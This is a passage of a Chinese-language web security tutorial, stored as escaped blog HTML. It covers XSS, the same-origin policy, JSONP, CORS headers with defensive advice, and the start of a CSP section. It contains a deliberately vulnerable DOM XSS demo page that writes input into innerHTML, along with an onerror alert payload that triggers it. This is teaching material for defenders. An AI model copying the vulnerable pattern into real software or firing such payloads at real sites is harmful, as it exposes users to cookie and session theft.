&lt;p&gt;例如&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;figcaption data-lang=&#34;HTML&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;html&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;head&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;title&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;DOM Based XSS Demo&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;title&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;script&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token script&#34;&gt;&lt;span class=&#34;token language-javascript&#34;&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;xsstest&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;var&lt;/span&gt; str &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; document&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getElementById&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;input&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;value&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    document&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getElementById&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;output&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;innerHTML &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;&amp;lt;img src=&#39;&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;str&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;&#39;&gt;&amp;lt;/img&gt;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;script&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;head&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;body&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;div&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;output&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;div&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;input&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;text&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;input&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;size&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;50&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;input&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;button&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;submit&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token special-attr&#34;&gt;&lt;span class=&#34;token attr-name&#34;&gt;onclick&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;span class=&#34;token value javascript language-javascript&#34;&gt;&lt;span class=&#34;token function&#34;&gt;xsstest&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;body&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;html&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;输入  &lt;code&gt;x&#39; onerror=&#39;javascript:alert(/xss/)&lt;/code&gt;  即可触发。&lt;/p&gt;
&lt;h2 id=&#34;blind-xss&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#blind-xss&#34;&gt;#&lt;/a&gt; Blind XSS&lt;/h2&gt;
&lt;p&gt;Blind XSS 是储存型 XSS 的一种，它保存在某些存储中，当一个 “受害者” 访问这个页面时执行，并且在文档对象模型 (DOM) 中呈现 payload。 它被称为 Blind 的原因是因为它通常发生在通常不暴露给用户的功能上。&lt;/p&gt;
&lt;h1 id=&#34;危害&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#危害&#34;&gt;#&lt;/a&gt; 危害&lt;/h1&gt;
&lt;p&gt;存在 XSS 漏洞时，可能会导致以下几种情况：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;用户的 Cookie 被获取，其中可能存在 Session ID 等敏感信息。若服务器端没有做相应防护，攻击者可用对应 Cookie 登陆服务器。&lt;/li&gt;
&lt;li&gt;攻击者能够在一定限度内记录用户的键盘输入。&lt;/li&gt;
&lt;li&gt;攻击者通过 CSRF 等方式以用户身份执行危险操作。&lt;/li&gt;
&lt;li&gt;XSS 蠕虫。&lt;/li&gt;
&lt;li&gt;获取用户浏览器信息。&lt;/li&gt;
&lt;li&gt;利用 XSS 漏洞扫描用户内网。&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;同源策略&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#同源策略&#34;&gt;#&lt;/a&gt; 同源策略&lt;/h1&gt;
&lt;h2 id=&#34;简介-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介-2&#34;&gt;#&lt;/a&gt; 简介&lt;/h2&gt;
&lt;p&gt;同源策略限制了不同源之间如何进行资源交互，是用于隔离潜在恶意文件的重要安全机制。 是否同源由 URL 决定，URL 由协议、域名、端口和路径组成，如果两个 URL 的协议、域名和端口相同，则表示他们同源。&lt;/p&gt;
&lt;h3 id=&#34;file域的同源策略&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#file域的同源策略&#34;&gt;#&lt;/a&gt; file 域的同源策略&lt;/h3&gt;
&lt;p&gt;在之前的浏览器中，任意两个 file 域的 URI 被认为是同源的。本地磁盘上的任何 HTML 文件都可以读取本地磁盘上的任何其他文件。&lt;/p&gt;
&lt;p&gt;从 Gecko 1.9 开始，文件使用了更细致的同源策略，只有当源文件的父目录是目标文件的祖先目录时，文件才能读取另一个文件。&lt;/p&gt;
&lt;h3 id=&#34;cookie的同源策略&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cookie的同源策略&#34;&gt;#&lt;/a&gt; cookie 的同源策略&lt;/h3&gt;
&lt;p&gt;cookie 使用不同的源定义方式，一个页面可以为本域和任何父域设置 cookie，只要是父域不是公共后缀 (public suffix) 即可。&lt;/p&gt;
&lt;p&gt;不管使用哪个协议 (HTTP/HTTPS) 或端口号，浏览器都允许给定的域以及其任何子域名访问 cookie。设置 cookie 时，可以使用  &lt;code&gt;domain&lt;/code&gt;  /  &lt;code&gt;path&lt;/code&gt;  /  &lt;code&gt;secure&lt;/code&gt;  和  &lt;code&gt;http-only&lt;/code&gt;  标记来限定其访问性。&lt;/p&gt;
&lt;p&gt;所以  &lt;code&gt;https://localhost:8080/&lt;/code&gt;  和  &lt;code&gt;http://localhost:8081/&lt;/code&gt;  的 Cookie 是共享的。&lt;/p&gt;
&lt;h3 id=&#34;flashsilverlight跨域&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#flashsilverlight跨域&#34;&gt;#&lt;/a&gt; Flash/SilverLight 跨域&lt;/h3&gt;
&lt;p&gt;浏览器的各种插件也存在跨域需求。通常是通过在服务器配置 crossdomain.xml，设置本服务允许哪些域名的跨域访问。&lt;/p&gt;
&lt;p&gt;客户端会请求此文件，如果发现自己的域名在访问列表里，就发起真正的请求，否则不发送请求。&lt;/p&gt;
&lt;h2 id=&#34;源的更改&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#源的更改&#34;&gt;#&lt;/a&gt; 源的更改&lt;/h2&gt;
&lt;p&gt;同源策略认为域和子域属于不同的域，例如  &lt;code&gt;child1.a.com&lt;/code&gt;  与  &lt;code&gt;a.com&lt;/code&gt;  /  &lt;code&gt;child1.a.com&lt;/code&gt;  与  &lt;code&gt;child2.a.com&lt;/code&gt;  /  &lt;code&gt;xxx.child1.a.com&lt;/code&gt;  与  &lt;code&gt;child1.a.com&lt;/code&gt;  两两不同源。&lt;/p&gt;
&lt;p&gt;对于这种情况，可以在两个方面各自设置  &lt;code&gt;document.domain=&#39;a.com&#39;&lt;/code&gt;  来改变其源来实现以上任意两个页面之间的通信。&lt;/p&gt;
&lt;p&gt;另外因为浏览器单独保存端口号，这种赋值会导致端口号被重写为  &lt;code&gt;null&lt;/code&gt;  。&lt;/p&gt;
&lt;h2 id=&#34;跨源访问&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#跨源访问&#34;&gt;#&lt;/a&gt; 跨源访问&lt;/h2&gt;
&lt;p&gt;同源策略控制了不同源之间的交互，这些交互通常分为三类：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;通常允许跨域写操作 (Cross-origin writes)
&lt;ul&gt;
&lt;li&gt;链接 (links)&lt;/li&gt;
&lt;li&gt;重定向&lt;/li&gt;
&lt;li&gt;表单提交&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;通常允许跨域资源嵌入 (Cross-origin embedding)&lt;/li&gt;
&lt;li&gt;通常不允许跨域读操作 (Cross-origin reads)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;可能嵌入跨源的资源的一些示例有：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;script src=&amp;quot;...&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;&lt;/code&gt;  标签嵌入跨域脚本。语法错误信息只能在同源脚本中捕捉到。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;link rel=&amp;quot;stylesheet&amp;quot; href=&amp;quot;...&amp;quot;&amp;gt;&lt;/code&gt;  标签嵌入 CSS。由于 CSS 的松散的语法规则，CSS 的跨域需要一个设置正确的 Content-Type 消息头。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;img&amp;gt;&lt;/code&gt;  /  &lt;code&gt;&amp;lt;video&amp;gt;&lt;/code&gt;  /  &lt;code&gt;&amp;lt;audio&amp;gt;&lt;/code&gt;  嵌入多媒体资源。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;object&amp;gt;&lt;/code&gt;   &lt;code&gt;&amp;lt;embed&amp;gt;&lt;/code&gt;  和  &lt;code&gt;&amp;lt;applet&amp;gt;&lt;/code&gt;  的插件。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;@font-face&lt;/code&gt;  引入的字体。一些浏览器允许跨域字体 (cross-origin fonts)，一些需要同源字体 (same-origin fonts)。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;frame&amp;gt;&lt;/code&gt;  和  &lt;code&gt;&amp;lt;iframe&amp;gt;&lt;/code&gt;  载入的任何资源。站点可以使用 X-Frame-Options 消息头来阻止这种形式的跨域交互。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;jsonp跨域&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#jsonp跨域&#34;&gt;#&lt;/a&gt; JSONP 跨域&lt;/h3&gt;
&lt;p&gt;JSONP 就是利用  &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt;  标签的跨域能力实现跨域数据的访问，请求动态生成的 JavaScript 脚本同时带一个 callback 函数名作为参数。&lt;/p&gt;
&lt;p&gt;服务端收到请求后，动态生成脚本产生数据，并在代码中以产生的数据为参数调用 callback 函数。&lt;/p&gt;
&lt;p&gt;JSONP 也存在一些安全问题，例如当对传入 / 传回参数没有做校验就直接执行返回的时候，会造成 XSS 问题。没有做 Referer 或 Token 校验就给出数据的时候，可能会造成数据泄露。&lt;/p&gt;
&lt;p&gt;另外 JSONP 在没有设置 callback 函数的白名单情况下，可以合法的做一些设计之外的函数调用，引入问题。这种攻击也被称为 SOME 攻击。&lt;/p&gt;
&lt;h3 id=&#34;跨源脚本api访问&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#跨源脚本api访问&#34;&gt;#&lt;/a&gt; 跨源脚本 API 访问&lt;/h3&gt;
&lt;p&gt;Javascript 的 APIs 中，如  &lt;code&gt;iframe.contentWindow&lt;/code&gt;  ,  &lt;code&gt;window.parent&lt;/code&gt; ,  &lt;code&gt;window.open&lt;/code&gt;  和  &lt;code&gt;window.opener&lt;/code&gt;  允许文档间相互引用。当两个文档的源不同时，这些引用方式将对  &lt;code&gt;window&lt;/code&gt;  和  &lt;code&gt;location&lt;/code&gt;  对象的访问添加限制。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;window&lt;/code&gt;  允许跨源访问的方法有&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;window.blur&lt;/li&gt;
&lt;li&gt;window.close&lt;/li&gt;
&lt;li&gt;window.focus&lt;/li&gt;
&lt;li&gt;window.postMessage&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;code&gt;window&lt;/code&gt;  允许跨源访问的属性有&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;window.closed&lt;/li&gt;
&lt;li&gt;window.frames&lt;/li&gt;
&lt;li&gt;window.length&lt;/li&gt;
&lt;li&gt;window.location&lt;/li&gt;
&lt;li&gt;window.opener&lt;/li&gt;
&lt;li&gt;window.parent&lt;/li&gt;
&lt;li&gt;window.self&lt;/li&gt;
&lt;li&gt;window.top&lt;/li&gt;
&lt;li&gt;window.window&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;其中  &lt;code&gt;window.location&lt;/code&gt;  允许读 / 写，其他的属性只允许读&lt;/p&gt;
&lt;h3 id=&#34;跨源数据存储访问&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#跨源数据存储访问&#34;&gt;#&lt;/a&gt; 跨源数据存储访问&lt;/h3&gt;
&lt;p&gt;存储在浏览器中的数据，如  &lt;code&gt;localStorage&lt;/code&gt;  和  &lt;code&gt;IndexedDB&lt;/code&gt; ，以源进行分割。每个源都拥有自己单独的存储空间，一个源中的 Javascript 脚本不能对属于其它源的数据进行读写操作。&lt;/p&gt;
&lt;h2 id=&#34;cors&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cors&#34;&gt;#&lt;/a&gt; CORS&lt;/h2&gt;
&lt;p&gt;CORS 是一个 W3C 标准，全称是跨域资源共享 (Cross-origin resource sharing)。通过这个标准，可以允许浏览器读取跨域的资源。&lt;/p&gt;
&lt;h3 id=&#34;常见请求头&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常见请求头&#34;&gt;#&lt;/a&gt; 常见请求头&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Origin
&lt;ul&gt;
&lt;li&gt;预检请求或实际请求的源站 URI, 浏览器请求默认会发送该字段&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Origin: &amp;lt;origin&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Access-Control-Request-Method
&lt;ul&gt;
&lt;li&gt;声明请求使用的方法&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Access-Control-Request-Method: &amp;lt;method&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Access-Control-Request-Headers
&lt;ul&gt;
&lt;li&gt;声明请求使用的 header 字段&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Access-Control-Request-Headers: &amp;lt;field-name&amp;gt;[, &amp;lt;field-name&amp;gt;]*&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;常见返回头&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常见返回头&#34;&gt;#&lt;/a&gt; 常见返回头&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Access-Control-Allow-Origin
&lt;ul&gt;
&lt;li&gt;声明允许访问的源外域 URI&lt;/li&gt;
&lt;li&gt;对于携带身份凭证的请求不可使用通配符&lt;/li&gt;
&lt;li&gt;&lt;code&gt;*``Access-Control-Allow-Origin: &amp;lt;origin&amp;gt; | *&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Access-Control-Expose-Headers
&lt;ul&gt;
&lt;li&gt;声明允许暴露的头&lt;/li&gt;
&lt;li&gt;e.g.  &lt;code&gt;Access-Control-Expose-Headers: X-My-Custom-Header, X-Another-Custom-Header&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Access-Control-Max-Age
&lt;ul&gt;
&lt;li&gt;声明 Cache 时间&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Access-Control-Max-Age: &amp;lt;delta-seconds&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Access-Control-Allow-Credentials
&lt;ul&gt;
&lt;li&gt;声明是否允许在请求中带入&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Access-Control-Allow-Credentials: true&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Access-Control-Allow-Methods
&lt;ul&gt;
&lt;li&gt;声明允许的访问方式&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Access-Control-Allow-Methods: &amp;lt;method&amp;gt;[, &amp;lt;method&amp;gt;]*&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Access-Control-Allow-Headers
&lt;ul&gt;
&lt;li&gt;声明允许的头&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Access-Control-Allow-Headers: &amp;lt;field-name&amp;gt;[, &amp;lt;field-name&amp;gt;]*&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;防御建议&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#防御建议&#34;&gt;#&lt;/a&gt; 防御建议&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;如非必要不开启 CORS&lt;/li&gt;
&lt;li&gt;定义详细的白名单，不使用通配符，仅配置所需要的头&lt;/li&gt;
&lt;li&gt;配置  &lt;code&gt;Vary: Origin&lt;/code&gt;  头部&lt;/li&gt;
&lt;li&gt;如非必要不使用  &lt;code&gt;Access-Control-Allow-Credentials&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;限制缓存的时间&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;阻止跨源访问&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#阻止跨源访问&#34;&gt;#&lt;/a&gt; 阻止跨源访问&lt;/h2&gt;
&lt;p&gt;阻止跨域写操作，可以检测请求中的  &lt;code&gt;CSRF token&lt;/code&gt;  ，这个标记被称为 Cross-Site Request Forgery (CSRF) 标记。&lt;/p&gt;
&lt;p&gt;阻止资源的跨站读取，因为嵌入资源通常会暴露信息，需要保证资源是不可嵌入的。但是多数情况下浏览器都不会遵守  &lt;code&gt;Content-Type&lt;/code&gt;  消息头。例如如果在 HTML 文档中指定  &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt;  标记，则浏览器会尝试将 HTML 解析为 JavaScript。&lt;/p&gt;
&lt;h1 id=&#34;csp&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#csp&#34;&gt;#&lt;/a&gt; CSP&lt;/h1&gt;
&lt;h2 id=&#34;csp是什么&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#csp是什么&#34;&gt;#&lt;/a&gt; CSP 是什么？&lt;/h2&gt;
&lt;p&gt;Content Security Policy，简称 CSP，译作内容安全策略。顾名思义，这个规范与内容安全有关，主要是用来定义哪些资源可以被当前页面加载，减少 XSS 的发生。&lt;/p&gt;
&lt;h2 id=&#34;配置&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#配置&#34;&gt;#&lt;/a&gt; 配置&lt;/h2&gt;
&lt;p&gt;CSP 策略可以通过 HTTP 头信息或者 meta 元素定义。&lt;/p&gt;
&lt;p&gt;CSP 有三类：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Content-Security-Policy (Google Chrome)&lt;/li&gt;
&lt;li&gt;X-Content-Security-Policy (Firefox)&lt;/li&gt;
&lt;li&gt;X-WebKit-CSP (WebKit-based browsers, e.g. Safari)&lt;/li&gt;
&lt;/ul&gt;
